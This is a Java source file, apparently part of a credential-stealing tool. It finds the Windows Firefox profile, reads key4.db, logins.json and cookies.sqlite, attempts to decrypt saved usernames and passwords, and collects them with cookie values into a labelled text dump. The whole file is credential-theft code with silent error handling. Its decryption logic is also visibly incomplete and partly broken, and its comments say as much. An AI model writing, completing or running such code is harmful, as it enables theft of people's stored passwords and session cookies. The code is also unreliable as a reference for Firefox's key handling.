package me.visoxd.browser;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.Security;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Base64;

public class FirefoxExtractor {
    
    static {
        Security.addProvider(new BouncyCastleProvider());
    }
    
    public static String extractFirefoxData() {
        try {
            String profilePath = getFirefoxProfilePath();
            if (profilePath == null) {
                return null;
            }
            
            StringBuilder result = new StringBuilder();
            result.append("--- Firefox ---\n");
            
            // Extract master key from key4.db
            byte[] masterKey = extractMasterKey(profilePath);
            if (masterKey == null) {
                return null;
            }
            
            // Extract passwords
            String passwords = extractPasswords(profilePath, masterKey);
            if (passwords != null && !passwords.isEmpty()) {
                result.append("PASSWORDS:\n").append(passwords);
            }
            
            // Extract cookies
            String cookies = extractCookies(profilePath);
            if (cookies != null && !cookies.isEmpty()) {
                result.append("COOKIES:\n").append(cookies);
            }
            
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String getFirefoxProfilePath() {
        try {
            String firefoxPath = System.getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles";
            File profilesDir = new File(firefoxPath);
            
            if (!profilesDir.exists()) {
                return null;
            }
            
            // Find default-release profile
            File[] profiles = profilesDir.listFiles((dir, name) -> name.endsWith(".default-release"));
            if (profiles == null || profiles.length == 0) {
                // Try any default profile
                profiles = profilesDir.listFiles((dir, name) -> name.contains("default"));
            }
            
            if (profiles != null && profiles.length > 0) {
                return profiles[0].getAbsolutePath();
            }
            
            return null;
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static byte[] extractMasterKey(String profilePath) {
        try {
            File key4File = new File(profilePath, "key4.db");
            if (!key4File.exists()) {
                return null;
            }
            
            // Copy to temp
            File tempFile = File.createTempFile("key4", ".db");
            tempFile.deleteOnExit();
            Files.copy(key4File.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            
            byte[] masterKey = null;
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
                 Statement stmt = conn.createStatement()) {
                
                // Get global salt
                ResultSet metaRs = stmt.executeQuery(
                    "SELECT item1, item2 FROM metadata WHERE id = 'password'"
                );
                
                if (!metaRs.next()) {
                    return null;
                }
                
                byte[] globalSalt = metaRs.getBytes("item1");
                byte[] item2 = metaRs.getBytes("item2");
                
                // Get encrypted master key
                ResultSet nssRs = stmt.executeQuery(
                    "SELECT a11, a102 FROM nssPrivate"
                );
                
                if (!nssRs.next()) {
                    return null;
                }
                
                byte[] a11 = nssRs.getBytes("a11");
                byte[] a102 = nssRs.getBytes("a102");
                
                // Derive key using PBKDF2 (assuming no master password)
                masterKey = deriveMasterKey(globalSalt, new byte[0]);
                
                // Decrypt and verify (simplified - full implementation would parse ASN.1)
                // For now, return a basic derived key
                return masterKey;
                
            } finally {
                tempFile.delete();
            }
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static byte[] deriveMasterKey(byte[] salt, byte[] password) {
        try {
            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            PBEKeySpec spec = new PBEKeySpec(
                password.length == 0 ? new char[0] : new String(password).toCharArray(),
                salt,
                1,
                256
            );
            SecretKey tmp = factory.generateSecret(spec);
            return tmp.getEncoded();
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String extractPasswords(String profilePath, byte[] masterKey) {
        try {
            File loginsFile = new File(profilePath, "logins.json");
            if (!loginsFile.exists()) {
                return null;
            }
            
            String loginsJson = new String(Files.readAllBytes(loginsFile.toPath()));
            JsonObject json = JsonParser.parseString(loginsJson).getAsJsonObject();
            JsonArray logins = json.getAsJsonArray("logins");
            
            StringBuilder result = new StringBuilder();
            int count = 0;
            
            for (int i = 0; i < logins.size() && count < 50; i++) {
                JsonObject login = logins.get(i).getAsJsonObject();
                
                String hostname = login.get("hostname").getAsString();
                String encryptedUsername = login.get("encryptedUsername").getAsString();
                String encryptedPassword = login.get("encryptedPassword").getAsString();
                
                try {
                    String username = decrypt3DES(encryptedUsername, masterKey);
                    String password = decrypt3DES(encryptedPassword, masterKey);
                    
                    if (username != null && password != null && !username.isEmpty()) {
                        result.append("  URL: ").append(hostname).append("\n");
                        result.append("  User: ").append(username).append("\n");
                        result.append("  Pass: ").append(password).append("\n\n");
                        count++;
                    }
                } catch (Exception e) {
                    // Skip this entry
                }
            }
            
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String decrypt3DES(String encryptedB64, byte[] masterKey) {
        try {
            byte[] encrypted = Base64.getDecoder().decode(encryptedB64);
            
            // Simple ASN.1 parsing (real implementation would use proper ASN.1 parser)
            // Skip to actual encrypted data (typically starts after ~10-20 bytes of ASN.1 header)
            int offset = 0;
            
            // Find sequence of encrypted data
            for (int i = 0; i < encrypted.length - 32; i++) {
                if (encrypted[i] == 0x04) { // OCTET STRING tag
                    offset = i + 2; // Skip tag and length
                    if (encrypted[i + 1] < 0x80) {
                        offset = i + 2;
                    } else {
                        offset = i + 3;
                    }
                    break;
                }
            }
            
            if (offset == 0 || offset >= encrypted.length - 16) {
                return null;
            }
            
            // Extract IV (first 8 bytes for 3DES)
            byte[] iv = new byte[8];
            System.arraycopy(encrypted, offset, iv, 0, 8);
            
            // Extract ciphertext
            byte[] ciphertext = new byte[encrypted.length - offset - 8];
            System.arraycopy(encrypted, offset + 8, ciphertext, 0, ciphertext.length);
            
            // Prepare key (use first 24 bytes of master key for 3DES)
            byte[] keyBytes = new byte[24];
            System.arraycopy(masterKey, 0, keyBytes, 0, Math.min(24, masterKey.length));
            
            // Try 3DES decryption
            try {
                Cipher cipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
                SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "DESede");
                IvParameterSpec ivSpec = new IvParameterSpec(iv);
                cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
                byte[] decrypted = cipher.doFinal(ciphertext);
                return new String(decrypted, "UTF-8");
            } catch (Exception e) {
                // Try AES-256-CBC (Firefox 144+)
                byte[] aesKey = new byte[32];
                System.arraycopy(masterKey, 0, aesKey, 0, Math.min(32, masterKey.length));
                
                byte[] aesIv = new byte[16];
                System.arraycopy(encrypted, offset, aesIv, 0, 16);
                
                byte[] aesCiphertext = new byte[encrypted.length - offset - 16];
                System.arraycopy(encrypted, offset + 16, aesCiphertext, 0, aesCiphertext.length);
                
                Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                SecretKeySpec aesKeySpec = new SecretKeySpec(aesKey, "AES");
                IvParameterSpec aesIvSpec = new IvParameterSpec(aesIv);
                aesCipher.init(Cipher.DECRYPT_MODE, aesKeySpec, aesIvSpec);
                byte[] aesDecrypted = aesCipher.doFinal(aesCiphertext);
                return new String(aesDecrypted, "UTF-8");
            }
            
        } catch (Exception e) {
            return null;
        }
    }
    
    private static String extractCookies(String profilePath) {
        try {
            File cookiesFile = new File(profilePath, "cookies.sqlite");
            if (!cookiesFile.exists()) {
                return null;
            }
            
            // Copy to temp
            File tempFile = File.createTempFile("cookies", ".db");
            tempFile.deleteOnExit();
            Files.copy(cookiesFile.toPath(), tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            
            StringBuilder result = new StringBuilder();
            
            try (Connection conn = DriverManager.getConnection("jdbc:sqlite:" + tempFile.getAbsolutePath());
                 Statement stmt = conn.createStatement()) {
                
                ResultSet rs = stmt.executeQuery(
                    "SELECT host, name, value FROM moz_cookies LIMIT 100"
                );
                
                while (rs.next()) {
                    String host = rs.getString("host");
                    String name = rs.getString("name");
                    String value = rs.getString("value");
                    
                    if (value != null && !value.isEmpty()) {
                        result.append("  ").append(host).append(" - ").append(name)
                              .append(": ").append(value.substring(0, Math.min(value.length(), 50)))
                              .append("\n");
                    }
                }
            }
            
            tempFile.delete();
            return result.toString();
            
        } catch (Exception e) {
            return null;
        }
    }
}
